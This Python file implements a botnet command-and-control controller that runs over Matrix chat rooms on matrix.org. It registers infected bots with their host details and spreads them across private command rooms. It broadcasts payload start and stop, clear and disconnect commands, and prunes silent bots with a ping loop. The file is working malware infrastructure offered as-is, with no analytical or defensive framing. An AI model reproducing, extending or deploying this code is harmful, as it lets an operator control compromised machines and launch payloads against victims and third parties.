import random
import threading
import time
from matrix_client.client import MatrixClient, Room
from matrix_client.api import MatrixRequestError
from requests.exceptions import MissingSchema
import os
import sys
from dotenv import load_dotenv
from datetime import datetime
import json
from dataclasses import dataclass

load_dotenv()
USER_NAME = os.getenv('CONTROLLER_NAME')  
PASSWORD = os.getenv('CONTROLLER_PASSWORD')
BOTS_NAME = os.getenv('BOT_NAME')
ANNOUNCE_ROOM_ID = os.getenv('ANNOUNCE_ROOM_ID')
MATRIX_HOMESERVER = "https://matrix.org"


@dataclass
class Bot:
    hostname: str
    platform: str
    platform_version: str
    machine: str
    bot_id: str
    python_version: str
    
    def __init__(self, data: dict):
        self.hostname = data.get("hostname", "UNKNOWN")
        self.platform = data.get("platform", "UNKNOWN")
        self.platform_version = data.get("platform_version", "UNKNOWN")
        self.machine = data.get("machine", "UNKNOWN")
        self.bot_id = data.get("bot_id", "UNKNOWN")
        self.python_version = data.get("python_version", "UNKNOWN")


class CommandRoom:
    bots: dict[str, list[Bot, bool]]
    room: Room
    payload_status: bool

    def __init__(self, room):
        self.room = room
        self.bots = {}
        self.payload_status = False


    def __str__(self):
        return f"{self.bots}"
    
    def add_bot(self, bot_data) -> Bot:
        bot: Bot = Bot(bot_data)
        self.bots[bot.bot_id] = [bot, True]
        return bot

    def remove_bot(self, bot_id) -> bool:
        try:
            del self.bots[bot_id]
            return True
        except:
            # print("Tried removing non-existing bot", bot_id)
            return False
        
    def set_active(self, bot_id) -> bool:
        """
        return False if bot_id doesnt exist
        """
        if bot_id not in self.bots:
            print("Couldn't find active bot")
            return False
        self.bots[bot_id][1] = True
        return True
    
    def set_all_inactive(self):
        for bot in self.bots.values():
            bot[1] = False
    
    def delete_inactive_bots(self):
        self.bots = {k: bot for k, bot in self.bots.items() if bot[1] == True}

    def start_payload(self):
        self.send_cmd("PAYLOAD:START")
        self.payload_status = True

    def stop_payload(self):
        self.send_cmd("PAYLOAD:STOP")
        self.payload_status = False

    def leave(self) -> bool:
        return self.room.leave()
    
    def clear_bot(self, bot_id: str) -> bool:
        return self.send_cmd(f"CLEAR:{bot_id}")
    
    def clear(self) -> bool:
        return self.send_cmd("CLEAR:ALL")
    
    def disconnect_bots(self):
        self.send_cmd("DISCONNECT")

    def send_cmd(self, cmd) -> bool:
        if len(self.bots) > 0:
            return self.room.send_text(f"COMMAND:{cmd}")
        return True
        

class BotnetController:
    access_token: str
    announce_room: Room
    command_rooms: dict[str, CommandRoom]

    def __init__(self):
        self.device_id = "BOTCONTROLLER"
        self.command_room_prefix = "cmd_"
        self.client = MatrixClient(MATRIX_HOMESERVER)
        self.command_rooms = {}
        self.command_room_lock = threading.Lock()
        
        self.pong_window_start = 0
        self.pong_window_dur = 45

    def login(self):
        # login and sync
        try:
            self.access_token = self.client.login(username=USER_NAME, password=PASSWORD)
            # print("[+] Logged in as controller.")
        except MatrixRequestError as e:
            print(e)
            if e.code == 403:
                print("Bad username or password.")
                sys.exit(4)
            else:
                print("Check your sever details are correct.")
                sys.exit(2)
        except MissingSchema as e:
            print("Bad URL format.")
            print(e)
            sys.exit(3)
            
    def join_room(self, roomid) -> Room:
        try:
            room = self.client.rooms[roomid]
        except KeyError:
            room = self.client.join_room(roomid)
        return room
            
    def sync_rooms(self):
        joined_rooms: dict[str, Room] = self.client.rooms
        for id, room in joined_rooms.items():
            if room.name.startswith(self.command_room_prefix):
                with self.command_room_lock:
                    self.command_rooms[id] = CommandRoom(room)
            elif room.name == "announcements":
                self.announce_room = self.join_room(ANNOUNCE_ROOM_ID)

    def for_all_rooms(self, f, *args):
        with self.command_room_lock:
            for cmd_room in self.command_rooms.values():
                f(cmd_room, *args)
            
    def assign_bot(self, botdata, roomid):
        """
        Lock needs to be aquired
        """
        self.command_rooms[roomid].add_bot(botdata)
        
    def clear_room(self, room: CommandRoom):
        room.clear()
        
    def delete_room(self, room: CommandRoom):
        with self.command_room_lock:
            self.clear_room(room)
            room.leave()
            del self.command_rooms[room.room.room_id]

    def on_message(self, _room, event):
        msgbody: str = event["content"]["body"]
        action, info = msgbody.split(":", 1)
        
        if action == "CONNECT":
            if len(self.command_rooms) == 0:
                return
            msgbody = msgbody.removeprefix("CONNECT:")
            msgbody = json.loads(msgbody)
            botid = msgbody["bot_id"]
            # Uniform distr so should be fine
            room_id = random.choice(list(self.command_rooms.keys()))
            if not self.command_room_lock.acquire(False):
                return
            self.announce_room.send_text(
                "RESOLVE {}:{}:{}".format(botid, "E" if self.command_rooms[room_id].payload_status else "D", room_id)
            )
            self.assign_bot(msgbody, room_id)
            self.command_room_lock.release()
            
        elif action == "DISCONNECT":
            if not self.command_room_lock.acquire(False):
                return
            room_id, bot_id = info.rsplit(":", 1)
            self.command_rooms[room_id].remove_bot(bot_id)
            self.command_room_lock.release()
            
        elif action == "PONG":
            room_id, bot_id, pong_origin = info.rsplit(":", 2)
            pong_origin = float(pong_origin)
            if not (self.pong_window_start <= pong_origin <= self.pong_window_start + self.pong_window_dur + 5):
                # pong too late :(
                print("PONG TOO LATE")
                self.command_rooms[room_id].clear_bot(bot_id)
                return
            
            with self.command_room_lock:
                self.command_rooms[room_id].set_active(bot_id)
            
    def create_room(self, name: str) -> Room:
        room: Room = self.client.create_room(name, is_public=False, invitees=[BOTS_NAME])
        room.set_room_name(name)
        return room
    
    def add_command_room(self, name: str):
        new_room = self.create_room(f"cmd_{name}")
        with self.command_room_lock:
            self.command_rooms[new_room.room_id] = CommandRoom(new_room)

    def start_payload_on_room(self, room: CommandRoom):
        room.start_payload()
    
    def start_payload_all_rooms(self):
        self.for_all_rooms(self.start_payload_on_room)

    def stop_payload_on_room(self, room: CommandRoom):
        room.stop_payload()
    
    def stop_payload_all_rooms(self):
        self.for_all_rooms(self.stop_payload_on_room)

    def disconnect_bots(self, room: CommandRoom):
        return room.disconnect_bots()

    def disconnect_all_bots(self):
        self.for_all_rooms(CommandRoom.disconnect_bots)


    def ping_loop(self):
        while True:
            time.sleep(15)
            # Mark
            with self.command_room_lock:
                for room in self.command_rooms.values():
                    room.set_all_inactive()

            self.pong_window_start = time.time()
            self.for_all_rooms(CommandRoom.send_cmd, "PING")
            time.sleep(self.pong_window_dur) # give time for pongs to come in
            
            # and Sweep
            with self.command_room_lock:
                for room in self.command_rooms.values():
                    room.delete_inactive_bots()
                    
    def run(self) -> bool:
        self.login()
        self.sync_rooms()
        
        self.announce_room.add_listener(self.on_message)
        self.client.start_listener_thread()
        
        threading.Thread(name="PING THREAD", target=self.ping_loop, daemon=True).start()
        return True
        
        